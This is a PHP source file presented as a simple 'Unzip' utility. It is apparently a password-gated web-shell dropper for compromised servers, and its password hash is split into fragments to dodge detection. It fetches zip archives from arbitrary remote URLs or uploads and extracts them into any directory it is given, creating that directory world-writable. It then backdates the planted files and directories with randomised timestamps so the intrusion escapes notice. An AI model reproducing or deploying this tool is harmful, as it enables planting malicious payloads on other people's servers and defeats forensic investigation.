<?php
$p = '7b'.'e88'.'5'.'ab5'.'80'.'71'.'6'.'de'.'94'.'3d7305'.'10'.'e17'.'3a'.'e';
function w() {
    die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}
if(!empty($p)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $p))
        c(md5($_SERVER['HTTP_HOST']), $p);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $p))
        w();
}
function c($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}





error_reporting(7);
ini_set('error_display', 1);
set_error_handler('myErrorHandler');

define('SELFDIR', dirname(__FILE__).DIRECTORY_SEPARATOR);
define('TIMEDELTA', 3600);
define('MAXFIILESIZE', ini_get('upload_max_filesize'));

$startTime=getmicrotime();

class zipfile_mod {
    /*
        zipfile class, for reading or writing .zip files
        See http://www.gamingg.net for more of my work
        Based on tutorial given by John Coggeshall at http://www.zend.com/zend/spotlight/creating-zip-files3.php
        Copyright (C) Joshua Townsend and licensed under the GPL
        Version 1.0
    */
    var $datasec=array(); // array to store compressed data
    var $files=array(); // array of uncompressed files
    var $dirs=array(); // array of directories that have been created already
    var $ctrl_dir=array(); // central directory
    var $eof_ctrl_dir="\x50\x4b\x05\x06\x00\x00\x00\x00"; //end of Central directory record
    var $old_offset=0;
    var $basedir=".";
    
    function create_dir($name)// Adds a directory to the zip with the name $name
{
        $name=str_replace("\\", "/", $name);
        
        $fr="\x50\x4b\x03\x04";
        $fr.="\x0a\x00"; // version needed to extract
        $fr.="\x00\x00"; // general purpose bit flag
        $fr.="\x00\x00"; // compression method
        $fr.="\x00\x00\x00\x00"; // last mod time and date
        

        $fr.=pack("V", 0); // crc32
        $fr.=pack("V", 0); //compressed filesize
        $fr.=pack("V", 0); //uncompressed filesize
        $fr.=pack("v", strlen($name)); //length of pathname
        $fr.=pack("v", 0); //extra field length
        $fr.=$name;
        // end of "local file header" segment
        

        // no "file data" segment for path
        

        // "data descriptor" segment (optional but necessary if archive is not served as file)
        $fr.=pack("V", 0); //crc32
        $fr.=pack("V", 0); //compressed filesize
        $fr.=pack("V", 0); //uncompressed filesize
        

        // add this entry to array
        $this->datasec[]=$fr;
        
        $new_offset=strlen(implode("", $this->datasec));
        
        // ext. file attributes mirrors MS-DOS directory attr byte, detailed
        // at http://support.microsoft.com/support/kb/articles/Q125/0/19.asp
        

        // now add to central record
        $cdrec="\x50\x4b\x01\x02";
        $cdrec.="\x00\x00"; // version made by
        $cdrec.="\x0a\x00"; // version needed to extract
        $cdrec.="\x00\x00"; // general purpose bit flag
        $cdrec.="\x00\x00"; // compression method
        $cdrec.="\x00\x00\x00\x00"; // last mod time and date
        $cdrec.=pack("V", 0); // crc32
        $cdrec.=pack("V", 0); //compressed filesize
        $cdrec.=pack("V", 0); //uncompressed filesize
        $cdrec.=pack("v", strlen($name)); //length of filename
        $cdrec.=pack("v", 0); //extra field length
        $cdrec.=pack("v", 0); //file comment length
        $cdrec.=pack("v", 0); //disk number start
        $cdrec.=pack("v", 0); //internal file attributes
        $cdrec.=pack("V", 16); //external file attributes  - 'directory' bit set
        

        $cdrec.=pack("V", $this->old_offset); //relative offset of local header
        $this->old_offset=$new_offset;
        
        $cdrec.=$name;
        // optional extra field, file comment goes here
        // save to array
        $this->ctrl_dir[]=$cdrec;
        $this->dirs[]=$name;
    }
    
    function create_file($data, $name)// Adds a file to the path specified by $name with the contents $data
{
        $name=str_replace("\\", "/", $name);
        
        $fr="\x50\x4b\x03\x04";
        $fr.="\x14\x00"; // version needed to extract
        $fr.="\x00\x00"; // general purpose bit flag
        $fr.="\x08\x00"; // compression method
        $fr.="\x00\x00\x00\x00"; // last mod time and date
        

        $unc_len=strlen($data);
        $crc=crc32($data);
        $zdata=gzcompress($data);
        $zdata=substr($zdata, 2, -4); // fix crc bug
        $c_len=strlen($zdata);
        $fr.=pack("V", $crc); // crc32
        $fr.=pack("V", $c_len); //compressed filesize
        $fr.=pack("V", $unc_len); //uncompressed filesize
        $fr.=pack("v", strlen($name)); //length of filename
        $fr.=pack("v", 0); //extra field length
        $fr.=$name;
        // end of "local file header" segment
        

        // "file data" segment
        $fr.=$zdata;
        
        // "data descriptor" segment (optional but necessary if archive is not served as file)
        $fr.=pack("V", $crc); // crc32
        $fr.=pack("V", $c_len); // compressed filesize
        $fr.=pack("V", $unc_len); // uncompressed filesize
        

        // add this entry to array
        $this->datasec[]=$fr;
        
        $new_offset=strlen(implode("", $this->datasec));
        
        // now add to central directory record
        $cdrec="\x50\x4b\x01\x02";
        $cdrec.="\x00\x00"; // version made by
        $cdrec.="\x14\x00"; // version needed to extract
        $cdrec.="\x00\x00"; // general purpose bit flag
        $cdrec.="\x08\x00"; // compression method
        $cdrec.="\x00\x00\x00\x00"; // last mod time & date
        $cdrec.=pack("V", $crc); // crc32
        $cdrec.=pack("V", $c_len); //compressed filesize
        $cdrec.=pack("V", $unc_len); //uncompressed filesize
        $cdrec.=pack("v", strlen($name)); //length of filename
        $cdrec.=pack("v", 0); //extra field length
        $cdrec.=pack("v", 0); //file comment length
        $cdrec.=pack("v", 0); //disk number start
        $cdrec.=pack("v", 0); //internal file attributes
        $cdrec.=pack("V", 32); //external file attributes - 'archive' bit set
        

        $cdrec.=pack("V", $this->old_offset); //relative offset of local header
        $this->old_offset=$new_offset;
        
        $cdrec.=$name;
        // optional extra field, file comment goes here
        // save to central directory
        $this->ctrl_dir[]=$cdrec;
    }
    
    function read_zip($name, $callback=null){
        // Clear current file
        $this->datasec=array();
        
        // File information
        $this->name=$name;
        $this->mtime=filemtime($name);
        $this->size=filesize($name);
        
        // Read file
        $fh=fopen($name, "rb");
        $filedata=fread($fh, $this->size);
        fclose($fh);
        
        // Break into sections
        $filesecta=explode("\x50\x4b\x05\x06", $filedata);
        
        // ZIP Comment
        $unpackeda=unpack('x16/v1length', $filesecta[1]);
        $this->comment=substr($filesecta[1], 18, $unpackeda['length']);
        $this->comment=str_replace(array("\r\n", "\r"), "\n", $this->comment); // CR + LF and CR -> LF
        

        // Cut entries from the central directory
        $filesecta=explode("\x50\x4b\x01\x02", $filedata);
        $filesecta=explode("\x50\x4b\x03\x04", $filesecta[0]);
        array_shift($filesecta); // Removes empty entry/signature
        

        foreach($filesecta as $filedata){
            // CRC:crc, FD:file date, FT: file time, CM: compression method, GPF: general purpose flag, VN: version needed, CS: compressed size, UCS: uncompressed size, FNL: filename length
            $entrya=array();
            $entrya['error']="";
            
            $unpackeda=unpack("v1version/v1general_purpose/v1compress_method/v1file_time/v1file_date/V1crc/V1size_compressed/V1size_uncompressed/v1filename_length", $filedata);
            
            // Check for encryption
            $isencrypted=(($unpackeda['general_purpose']&0x0001) ? true : false);
            
            // Check for value block after compressed data
            if($unpackeda['general_purpose']&0x0008){
                $unpackeda2=unpack("V1crc/V1size_compressed/V1size_uncompressed", substr($filedata, -12));
                
                $unpackeda['crc']=$unpackeda2['crc'];
                $unpackeda['size_compressed']=$unpackeda2['size_uncompressed'];
                $unpackeda['size_uncompressed']=$unpackeda2['size_uncompressed'];
                
                unset($unpackeda2);
            }
            
            $entrya['name']=substr($filedata, 26, $unpackeda['filename_length']);
            
            if(substr($entrya['name'], -1)=="/")// skip directories
{
                continue;
            }
            
            $entrya['dir']=dirname($entrya['name']);
            $entrya['dir']=($entrya['dir']=="." ? "" : $entrya['dir']);
            $entrya['name']=basename($entrya['name']);
            
            $filedata=substr($filedata, 26+$unpackeda['filename_length']);
            
            if(strlen($filedata)!=$unpackeda['size_compressed']){
                $entrya['error']="Compressed size is not equal to the value given in header.";
            }
            
            if($isencrypted){
                $entrya['error']="Encryption is not supported.";
            }else{
                switch ($unpackeda['compress_method']) {
                    case 0 : // Stored
                        // Not compressed, continue
                        break;
                    case 8 : // Deflated
                        $filedata=gzinflate($filedata);
                        break;
                    case 12 : // BZIP2
                        if(!extension_loaded("bz2")){
                            @dl((strtolower(substr(PHP_OS, 0, 3))=="win") ? "php_bz2.dll" : "bz2.so");
                        }
                        
                        if(extension_loaded("bz2")){
                            $filedata=bzdecompress($filedata);
                        }else{
                            $entrya['error']="Required BZIP2 Extension not available.";
                        }
                        break;
                    default:
                        $entrya['error']="Compression method ({$unpackeda['compress_method']}) not supported.";
                }
                
                if(!$entrya['error']){
                    if($filedata===false){
                        $entrya['error']="Decompression failed.";
                    }elseif(strlen($filedata)!=$unpackeda['size_uncompressed']){
                        $entrya['error']="File size is not equal to the value given in header.";
                    }elseif(crc32($filedata)!=$unpackeda['crc']){
                        $entrya['error']="CRC32 checksum is not equal to the value given in header.";
                    }
                }
                
                $entrya['filemtime']=@mktime(($unpackeda['file_time']&0xf800)>>11, ($unpackeda['file_time']&0x07e0)>>5, ($unpackeda['file_time']&0x001f)<<1, ($unpackeda['file_date']&0x01e0)>>5, ($unpackeda['file_date']&0x001f), (($unpackeda['file_date']&0xfe00)>>9)+1980);
                $entrya['data']=$filedata;
            }
            
            if($callback==null)
                $this->files[]=$entrya;
            else{
                call_user_func($callback, $entrya);
                unset($entrya);
            }
        }
        
        if($callback==null)
            return $this->files;
    }
    
    function add_file($file, $dir=".", $file_blacklist=array(), $ext_blacklist=array()){
        $file=str_replace("\\", "/", $file);
        $dir=str_replace("\\", "/", $dir);
        
        if(strpos($file, "/")!==false){
            $dira=explode("/", "{$dir}/{$file}");
            $file=array_shift($dira);
            $dir=implode("/", $dira);
            unset($dira);
        }
        
        while(substr($dir, 0, 2)=="./"){
            $dir=substr($dir, 2);
        }
        while(substr($file, 0, 2)=="./"){
            $file=substr($file, 2);
        }
        if(!in_array($dir, $this->dirs)){
            if($dir=="."){
                $this->create_dir("./");
            }
            $this->dirs[]=$dir;
        }
        if(in_array($file, $file_blacklist)){
            return true;
        }
        foreach($ext_blacklist as $ext){
            if(substr($file, -1-strlen($ext))==".{$ext}"){
                return true;
            }
        }
        
        $filepath=(($dir&&$dir!=".") ? "{$dir}/" : "").$file;
        if(is_dir("{$this->basedir}/{$filepath}")){
            $dh=opendir("{$this->basedir}/{$filepath}");
            while(($subfile=readdir($dh))!==false){
                if($subfile!="."&&$subfile!=".."){
                    $this->add_file($subfile, $filepath, $file_blacklist, $ext_blacklist);
                }
            }
            closedir($dh);
        }else{
            $this->create_file(implode("", file("{$this->basedir}/{$filepath}")), $filepath);
        }
        
        return true;
    }
    
    function zipped_file()// return zipped file contents
{
        $data=implode("", $this->datasec);
        $ctrldir=implode("", $this->ctrl_dir);
        
        return $data.$ctrldir.$this->eof_ctrl_dir.pack("v", sizeof($this->ctrl_dir)).// total number of entries "on this disk"
pack("v", sizeof($this->ctrl_dir)).// total number of entries overall
pack("V", strlen($ctrldir)).// size of central dir
pack("V", strlen($data)).// offset to start of central dir
"\x00\x00"; // .zip file comment length
    }
}

class WebClient{
    
    function load($url, $ref='', $cookies=null){
        $purl=parse_url($url);
        $path=$purl['path'];
        if(!empty($purl['query']))$path.='?'.$purl['query'];
        return $this->_doRequest($purl['host'], $path, $ref, $cookies);
    }
    
    function _doRequest($host, $page, $ref='', $cookies=null){
        
        $headers=array(
            'User-Agent'=>'Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)',
            'Accept'=>'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
            'Accept-Language'=>'ru,en-us;q=0.7,en;q=0.3', 'Accept-Encoding'=>'none', 
            'Accept-Charset'=>'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7');
        
        $e1=$e2=null;
        $fp=@fsockopen($host, 80, $e1, $e2, 30);
        if(!$fp)
            return '';
        fwrite($fp, "GET $page HTTP/1.1\n");
        fwrite($fp, "Host: $host\n");
            foreach($headers as $key=>$value){
            $line="$key: $value\n";
            fwrite($fp, $line);
        }
        if($ref!='')
            fwrite($fp, "Referer: http://$host/\n");
        if(!empty($cookies))
            fwrite($fp, "Cookie: $cookies\n");
        //fwrite($fp, "Keep-Alive: 300\n");
        fwrite($fp, "Connection: close\n");
        //fwrite($fp, "If-Modified-Since: Wed, 15 Apr 2009 17:08:52 GMT\n");
        //fwrite($fp, "Cache-Control: max-age=0\n");
        
        fwrite($fp, "\n");
        
        $s='';
        while($d=fgets($fp))
            $s.=$d;
        fclose($fp);
        return $s;
    }
}

if(!isset($_POST['submit'])){
    
    $now=date("Y-m-d H:i", time()-99999999);
    
    ?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Unzip</title>
<script type="text/javascript">
function clearFileField(){    
    var fileField=document.getElementById('archive');
    fileField.value='';
}
</script>
</head>
<body>
<div align="center">
<h1>Unzip</h1>

<form action="" method="post" enctype="multipart/form-data" >
<table border="1" cellspacing="0">
    <tr>
        <td>target dir</td>
        <td><input type="text" name="targetdir" id="targetdir" size="70"
            value="<?php echo SELFDIR ?>" /></td>
    </tr>
    <tr>
        <td>file time</td>
        <td><input type="text" name="targettime" id="targettime" size="13" value="<?php echo $now; ?>" /></td>
    </tr>
    <tr>
        <td>zip (<?php echo MAXFIILESIZE;?>)</td>
        <td><input type="file" name="archive" id="archive" size="70" /></td>
    </tr>    
    <tr>
        <td>remote zip</td>
        <td><input type="text" name="remotezip" id="remotezip" size="70" onchange="clearFileField();" onkeydown="clearFileField();"
            value="" /></td>
    </tr>
    <tr>
        <td colspan="2">
            <input type="submit" name="submit" value="upload and unzip" />
        </td>
    </tr>
</table>
</form>

</div>
</body>
</html>
<?php 
    exit();
}
//////////////////////////
//get and validate params
//////////////////////////
$targetDirRaw=str_replace('\\', '/', @$_POST['targetdir']);
$targetTimeRaw=@$_POST['targettime'];
$remoteZip=@$_POST['remotezip'];

$targetDirRaw=preg_replace('|/{1,}|', DIRECTORY_SEPARATOR, $targetDirRaw);

$targetDir=null;
$targetTime=null;
$tmpFile=null;

$maxFileTime=null;
$rootTime=null;
$dirsMeta=null;

$errors=array();

//tagret dir
$targetDirRaw=trim($targetDirRaw);
if(empty($targetDirRaw))
    $errors[]="empty target dir path";
else{
    $targetDir=$targetDirRaw;
    $dirsMeta=getDirMeta($targetDir);
    $rootTime=filemtime($dirsMeta['root']);
    
    if(!is_dir($targetDir)){
        @mkdir($targetDir, 0777, true);
        if(!is_dir($targetDirRaw)||!is_writable($targetDir)){
            $errors[]="target dir not exists on is not writeable";
        }
    }
}

//target time
$targetTime=@strtotime($targetTimeRaw);
if($targetTime==-1){
    $errors[]="cannot parse time";
}

//archive file


if(!empty($remoteZip)){
    $tmpFile=@tempnam('/tmp', 'sklinz_');
    if($tmpFile===false){
        $tmpFile=SELFDIR.'sklinz.tmp';
    }
    $webClient=new WebClient();
    $data=@$webClient->load($remoteZip);
    if(empty($data)){
        $errors[]="zip file not loaded from remote url";
    }else{
        $fp=fopen($tmpFile, 'wb');
        if($fp){
            $success=fwrite($fp, $data);
            @fclose($fp);
            if($success===false)
                $errors[]="cannot write temp file $tmpFile";
        }else
            $errors[]="cannot write temp file $tmpFile";
    }
}else{
    if(empty($_FILES)){
        $errors[]="archive file not set";
    }else{
        $fileKey='archive';
        $parts=explode('.', $_FILES[$fileKey]['name']);
        if(strtolower($parts[count($parts)-1])!='zip'){
            $errors[]="archive file is not zip";
        }else{
            $tmpFile=$_FILES[$fileKey]['tmp_name'];
            
            if(!file_exists($_FILES[$fileKey]['tmp_name'])){
                $errors[]="zip file not found in upload dir";
            }
        }
    }
}

if(count($errors)>0){
    echo nl2br(join("\n", $errors));
    exit();
}

/////////////////////////
// extract archive
////////////////////////
$log=array();
$errors=array();

$targetDirPath=rtrim($targetDir, "\\/").DIRECTORY_SEPARATOR;

$zipper=new zipfile_mod();
$files=$zipper->read_zip($tmpFile, 'saveFile');

//set dirs time
foreach($dirsMeta['new_dirs'] as $dirPath){
    @touch($dirPath, $maxFileTime, $maxFileTime);
}
@touch($dirsMeta['root'], $maxFileTime, $maxFileTime);

unlink($tmpFile);

if(count($errors)>0){
    echo "UNZIP ERRORS<br />";
    echo nl2br(join("\n", $errors));
    echo "<br /><br />----------------------------------------------------------<br /><br />";
}
echo nl2br(join("\n", $log));

$endTime=getmicrotime();
$delta=($endTime-$startTime);
echo "<br /><br />DONE (work time: $delta)";

///////////// functions
function saveFile($metadata){
    global $targetDirPath, $targetTime, $errors, $log, $maxFileTime;
    
    $filePath=$targetDirPath.$metadata['name'];
    
    if(!empty($metadata['error'])){
        $errors[]=$filePath." - ".$metadata['error'];
        return;
    }
    
    $fp=fopen($filePath, 'wb');
    if($fp){
        $success=fwrite($fp, $metadata['data']);
        @fclose($fp);
        if($success===false){
            $errors[]=$filePath." - cannot write file";
        }else{
            $needFileTime=$targetTime+mt_rand(0, TIMEDELTA);
            if($needFileTime>$maxFileTime)
                $maxFileTime=$needFileTime;
            @touch($filePath, $needFileTime, $needFileTime);
            $log[]=$filePath." - OK";
        }
    }else
        $errors[]=$filePath." - cannot open file";

}

function getDirMeta($path){
    $path=rtrim($path, "\\/");
    $parts=explode(DIRECTORY_SEPARATOR, $path);
    
    $meta=array('root'=>'', 'new_dirs'=>array());
    
    while(!empty($parts)){
        $fullPath=join(DIRECTORY_SEPARATOR, $parts);
        if(is_dir($fullPath)){
            $meta['root']=$fullPath;
            break;
        }else{
            $meta['new_dirs'][]=$fullPath;
        }
        array_pop($parts);
    }
    
    return $meta;
}

function myErrorHandler($errno, $errstr, $errfile, $errline){
    global $errors;
    
    if(!error_reporting())
        return;
    
    $errors[]="[$errno] $errstr";
}

function getmicrotime(){
    list($usec, $sec)=explode(" ", microtime());
    return ((float)$usec+(float)$sec);
}
